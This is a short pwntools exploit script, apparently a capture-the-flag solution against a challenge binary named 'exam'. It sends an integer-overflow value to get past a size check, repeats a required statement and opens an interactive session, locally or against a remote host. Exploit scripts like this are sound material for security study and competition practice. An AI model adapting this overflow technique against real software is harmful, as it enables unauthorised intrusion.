#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('exam')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+301
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    threshold = 0x7ffffffe
    max_size = 0xffffffff+1
    overflow = threshold + max_size
    
    statement = "I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam.\n"
    io.sendline(str(overflow))

    for _ in range(3):
        io.recvuntil("booklet >:)")
        io.send(statement)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
